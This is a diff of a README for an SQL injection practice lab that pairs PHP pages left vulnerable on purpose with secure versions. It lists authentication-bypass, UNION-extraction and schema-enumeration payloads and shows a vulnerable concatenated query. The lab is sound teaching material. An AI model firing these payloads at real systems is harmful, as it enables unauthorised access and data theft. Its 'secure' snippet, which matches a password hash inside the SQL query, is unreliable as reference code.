@@ -1,94 +1,150 @@
-# PHP Login and Signup System
+# SQL Injection Practice Site
 
-A complete PHP authentication system with login, signup, and dashboard functionality.
+A comprehensive educational platform for learning about SQL injection vulnerabilities and secure coding practices. This project includes both **vulnerable implementations** (for practice) and **secure implementations** (for reference).
 
-## 📁 Files Included
+## ⚠️ **IMPORTANT DISCLAIMER**
+This project contains **deliberately vulnerable code** for educational purposes only. **NEVER use the vulnerable code in production environments!**
 
-- **config.php** - Database configuration and connection
-- **UserAuth.php** - User authentication class with login/signup methods
-- **login.php** - Login page with form handling
-- **signup.php** - Registration page with validation
-- **dashboard.php** - Protected dashboard page for logged-in users
-- **database.sql** - MySQL database schema
+## 📁 **Project Structure**
 
-## 🚀 Setup Instructions
+### 🔓 **Vulnerable Files (For Learning)**
+- **`vulnerable_login.php`** - Login page with SQL injection vulnerabilities
+- **`VulnerableUserAuth.php`** - Authentication class with intentional security flaws
+- **`vulnerable_dashboard.php`** - Dashboard showing successful exploitation
+- **`sample.php`** - Simple side-by-side comparison of vulnerable vs secure code
 
-### 1. Database Setup
-1. Create a MySQL database named `user_auth`
-2. Run the SQL script in `database.sql` to create the users table
-3. Update database credentials in `config.php` if needed
+### 🔒 **Secure Files (Reference Implementation)**
+- **`login.php`** - Secure login implementation
+- **`signup.php`** - Secure registration with validation
+- **`UserAuth.php`** - Secure authentication class using prepared statements
+- **`dashboard.php`** - Secure dashboard with proper session management
 
-### 2. Configuration
-Edit `config.php` and update these constants:
-```php
-define('DB_HOST', 'localhost');     // Your database host
-define('DB_USER', 'root');          // Your database username
-define('DB_PASS', '');              // Your database password
-define('DB_NAME', 'user_auth');     // Your database name
+### 📚 **Documentation & Setup**
+- **`config.php`** - Database configuration
+- **`database.sql`** - Basic database schema
+- **`enhanced_database.sql`** - Extended schema with sample data
+- **`SQL_INJECTION_GUIDE.md`** - Comprehensive learning guide
+- **`README.md`** - This file
+
+## 🎯 **Learning Objectives**
+- Understand how SQL injection vulnerabilities work
+- Practice identifying and exploiting SQL injection flaws
+- Learn the difference between vulnerable and secure code
+- Master proper security measures and prevention techniques
+- Gain hands-on experience with real attack scenarios
+
+## 🚀 **Quick Start**
+
+### **Prerequisites**
+- XAMPP, WAMP, or similar PHP/MySQL stack
+- Web browser
+- Basic understanding of PHP and SQL
+
+### **Installation**
+1. **Clone the repository:**
+   ```bash
+   git clone https://github.com/Sachin-Kumar-08/SQL-Injection-Practice-Site.git
+   cd SQL-Injection-Practice-Site
+   ```
+
+2. **Setup web server:**
+   - Copy files to your web server directory (e.g., `C:\xampp\htdocs\sql-injection-practice\`)
+   - Start Apache and MySQL services
+
+3. **Create database:**
+   ```sql
+   mysql -u root -p < database.sql
+   # or for extended practice:
+   mysql -u root -p < enhanced_database.sql
+   ```
+
+4. **Access the application:**
+   - Vulnerable version: `http://localhost/sql-injection-practice/vulnerable_login.php`
+   - Secure version: `http://localhost/sql-injection-practice/login.php`
+   - Sample comparison: `http://localhost/sql-injection-practice/sample.php`
+
+## 🎓 **Practice Exercises**
+
+### **Exercise 1: Authentication Bypass**
+**Target:** `vulnerable_login.php` or `sample.php`
+
+**Try these payloads in the email/username field:**
+```sql
+admin' OR '1'='1' --
+' OR 1=1 --
+admin' --
+' OR 'a'='a
 ```
 
-### 3. Web Server
-1. Place all files in your web server directory (e.g., `htdocs` for XAMPP)
-2. Start your web server (Apache) and MySQL
-3. Access the application via `http://localhost/login.php`
+### **Exercise 2: Data Extraction**
+**Target:** Search functionality in `vulnerable_login.php`
 
-## 🔧 Features
+**Try these UNION-based attacks:**
+```sql
+' UNION SELECT username,password FROM users --
+' UNION SELECT database(),version() --
+' UNION SELECT table_name,column_name FROM information_schema.columns --
+```
 
-### ✅ User Registration
-- Username validation (minimum 3 characters)
-- Email format validation
-- Password strength requirements (minimum 6 characters)
-- Password confirmation
-- Duplicate user checking
-- Secure password hashing
+### **Exercise 3: Compare Security**
+1. Test the same payloads on both vulnerable and secure forms
+2. Observe how prepared statements prevent injection
+3. Study the code differences between implementations
 
-### ✅ User Login
-- Email and password authentication
-- Password verification
-- Session management
-- Remember me functionality
-- Automatic redirect to dashboard
+## 🔧 **Features**
 
-### ✅ Security Features
-- Password hashing with PHP's `password_hash()`
-- SQL injection prevention with prepared statements
+### **🔓 Vulnerable Implementation Features:**
+- Direct string concatenation in SQL queries
+- No input validation or sanitization
+- Debug output showing actual SQL queries
+- Multiple injection points (login, search)
+- Real-time query visualization
+
+### **🔒 Secure Implementation Features:**
+- Prepared statements with parameter binding
+- Input validation and sanitization
+- Password hashing with `password_hash()`
 - XSS protection with `htmlspecialchars()`
 - Session-based authentication
-- Protected routes
+- CSRF protection ready
 
-### ✅ User Interface
-- Responsive design for all devices
-- Modern gradient styling
-- Form validation with error messages
-- Loading animations
-- Smooth transitions and hover effects
+### **📚 Educational Features:**
+- Side-by-side vulnerable vs secure comparison
+- Real-time SQL query debugging
+- Comprehensive learning guide
+- Multiple attack scenarios
+- Prevention technique demonstrations
 
-## 📱 Pages Overview
+## 🛡️ **Security Comparison**
 
-### Login Page (`login.php`)
-- Email and password fields
-- Form validation
-- Error/success messages
-- Link to signup page
-- Forgot password placeholder
+### **❌ Vulnerable Code:**
+```php
+// DANGEROUS - Never do this!
+$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
+$result = $pdo->query($query);
+```
 
-### Signup Page (`signup.php`)
-- Username, email, and password fields
-- Password confirmation
-- Real-time validation
-- Terms of service links
-- Link to login page
+### **✅ Secure Code:**
+```php
+// SAFE - Always use prepared statements
+$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
+$stmt->execute([$email, $hashedPassword]);
+```
 
-### Dashboard (`dashboard.php`)
-- Welcome message with user info
-- Navigation with logout option
-- Feature cards and statistics
-- Responsive layout
-- Protected route (requires login)
+## 🧪 **Test Accounts**
 
-## 🛠️ Technical Details
+### **Default Accounts:**
+- **Admin:** `admin@example.com` / `password123`
+- **User:** `test@example.com` / `password123`
+- **Sample:** `admin` / `password` (for sample.php)
 
-### Database Schema
+### **SQL Injection Bypass:**
+- **Email:** `admin@example.com' OR '1'='1' --`
+- **Password:** `anything`
+
+## 📊 **Database Schema**
+
+### **Basic Schema (database.sql):**
 ```sql
 CREATE TABLE users (
     id INT AUTO_INCREMENT PRIMARY KEY,
@@ -101,78 +157,87 @@ CREATE TABLE users (
 );
 ```
 
-### Security Measures
-- **Password Hashing**: Uses `password_hash()` with default algorithm
-- **Prepared Statements**: All database queries use PDO prepared statements
-- **Input Sanitization**: All user inputs are sanitized and validated
-- **Session Security**: Proper session management and validation
+### **Enhanced Schema (enhanced_database.sql):**
+- Extended user profiles
+- Sensitive data table (for data extraction practice)
+- Login attempt logs
+- Multiple user roles
 
-## 🧪 Testing
+## 🚨 **Common SQL Injection Payloads**
 
-### Test Account
-A test user is included in the database script:
-- **Email**: test@example.com
-- **Password**: password123
-
-### Manual Testing
-1. Register a new account via `signup.php`
-2. Login with your credentials via `login.php`
-3. Access the dashboard and test logout functionality
-
-## 🔗 File Dependencies
-
-```
-config.php (database connection)
-    ↓
-UserAuth.php (authentication class)
-    ↓
-login.php, signup.php, dashboard.php (main pages)
+### **Authentication Bypass:**
+```sql
+admin' --
+admin' OR '1'='1' --
+' OR 1=1 #
+') OR ('1'='1' --
 ```
 
-## 📝 Customization
+### **Union-Based Attacks:**
+```sql
+' UNION SELECT 1,2,3,4 --
+' UNION SELECT username,password,1,2 FROM users --
+' UNION SELECT database(),user(),version(),1 --
+```
 
-### Styling
-- Modify the CSS in each PHP file to match your brand
-- All styles are embedded for easy customization
-- Uses modern CSS with gradients and animations
+### **Information Gathering:**
+```sql
+' AND 1=0 UNION SELECT table_name,1,2,3 FROM information_schema.tables --
+' AND 1=0 UNION SELECT column_name,1,2,3 FROM information_schema.columns WHERE table_name='users' --
+```
 
-### Functionality
-- Add password reset functionality
-- Implement email verification
-- Add user roles and permissions
-- Integrate with external authentication providers
+## 🛡️ **Prevention Techniques**
 
-## ⚠️ Important Notes
+1. **Prepared Statements** (Most Important)
+2. **Input Validation and Sanitization**
+3. **Least Privilege Database Access**
+4. **Error Handling** (Don't expose database errors)
+5. **Web Application Firewalls**
+6. **Regular Security Audits**
 
-1. **Production Security**: 
-   - Change default database credentials
-   - Use HTTPS in production
-   - Implement rate limiting for login attempts
-   - Add CSRF protection
+## 📚 **Learning Resources**
 
-2. **Database**: 
-   - Ensure MySQL is running
-   - Grant proper permissions to the database user
-   - Consider using environment variables for credentials
+- **[OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)**
+- **[PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)**
+- **[OWASP WebGoat](https://owasp.org/www-project-webgoat/)**
+- **SQL_INJECTION_GUIDE.md** (included in this project)
 
-3. **Error Handling**: 
-   - Check PHP error logs for debugging
-   - Ensure PDO extension is enabled
-   - Verify database connection settings
+## ⚖️ **Legal and Ethical Guidelines**
 
-## 🚀 Next Steps
+### **🚨 IMPORTANT:**
+- **Only practice on your own systems or designated learning environments**
+- **Never attempt SQL injection on systems you don't own**
+- **Unauthorized testing is illegal and unethical**
+- **Use this knowledge to build more secure applications**
+- **Always obtain proper authorization before security testing**
 
-- Add email verification for new accounts
-- Implement password reset functionality
-- Add user profile management
-- Integrate with third-party authentication (Google, Facebook)
-- Add admin panel for user management
-- Implement API endpoints for mobile apps
+## 🤝 **Contributing**
 
-## 📞 Support
+Contributions are welcome! Please:
+1. Fork the repository
+2. Create a feature branch
+3. Add educational content or improve existing examples
+4. Submit a pull request
 
-If you encounter any issues:
-1. Check database connection in `config.php`
-2. Verify web server is running PHP 7.0+
-3. Ensure MySQL/MariaDB is running
-4. Check file permissions on your web server
+### **Ideas for Contributions:**
+- Additional SQL injection scenarios
+- More prevention examples
+- Different database types (PostgreSQL, SQLite)
+- Advanced attack techniques
+- Improved documentation
+
+## 📝 **License**
+
+This project is for educational purposes only. Use responsibly and ethically.
+
+## 📞 **Support**
+
+If you encounter issues:
+1. Check the `SQL_INJECTION_GUIDE.md` for detailed setup instructions
+2. Verify your web server and database are running
+3. Ensure proper file permissions
+4. Check PHP error logs for debugging
+
+---
+
+**Remember: The goal is to learn how to build secure applications, not to cause harm. Use this knowledge responsibly!**
